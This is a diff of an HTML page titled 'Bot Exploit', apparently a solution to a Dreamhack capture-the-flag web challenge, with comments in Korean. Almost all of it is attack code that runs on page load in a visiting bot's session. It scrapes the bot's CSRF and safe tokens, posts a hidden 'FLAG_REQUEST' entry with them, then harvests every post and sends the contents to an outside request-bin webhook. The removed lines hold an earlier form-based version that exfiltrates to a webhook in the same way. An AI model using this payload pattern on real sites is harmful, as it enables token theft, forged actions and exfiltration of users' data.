@@ -5,29 +5,43 @@
   <title>Bot Exploit</title>
 </head>
 <body>
-<form id="botForm" method="POST" action="http://host1.dreamhack.games:19792/write">
-  <input type="hidden" name="content" value="FLAG_REQUEST">
-  <input type="hidden" name="isHidden" value="true">
-  <input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">
-  <input type="hidden" name="safe_token" value="{{ session.safe_token }}">
-</form>
-
 <script>
-document.addEventListener('DOMContentLoaded', function() {
-    // 1. 봇이 form 자동 제출 (히든 게시물 작성)
-    document.getElementById('botForm').submit();
+document.addEventListener('DOMContentLoaded', async function() {
+    try {
+        // 1. 봇 세션에서 /write 페이지 열기
+        const writePage = await fetch('http://web/write');
+        const text = await writePage.text();
+        // CSRF/safe_token 추출 (봇 세션에서만 가능)
+        const csrfTokenMatch = text.match(/name="csrf_token" value="([^"]+)"/);
+        const safeTokenMatch = text.match(/safe_token="([^"]+)"/);
 
-    // 2. 일정 시간 후 히든 게시물 읽어서 웹훅 전송
-    setTimeout(function(){
-        const posts = document.querySelectorAll('.post-content');
-        posts.forEach(post => {
-            fetch("https://egxmzce.request.dreamhack.games/webhook", {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({content: post.innerText})
-            });
+        if (!csrfTokenMatch || !safeTokenMatch) return;
+
+        const csrfToken = csrfTokenMatch[1];
+        const safeToken = safeTokenMatch[1];
+
+        // 2. 히든 게시물 작성
+        await fetch('http://web/write', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: `content=FLAG_REQUEST&isHidden=true&csrf_token=${csrfToken}&safe_token=${safeToken}`
         });
-    }, 3000);
+
+        // 3. 일정 시간 후 모든 게시물 읽기
+        setTimeout(async () => {
+            const postsPage = await fetch('http://web/');
+            const postsText = await postsPage.text();
+            const postMatches = [...postsText.matchAll(/<div class="post-content"[^>]*>(.*?)<\/div>/g)];
+            const posts = postMatches.map(m => m[1]);
+
+            // 4. 웹훅으로 전송
+            await fetch('https://pnhzynn.request.dreamhack.games/webhook', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({posts})
+            });
+        }, 3000);
+    } catch(e) { console.error(e); }
 });
 </script>
 </body>
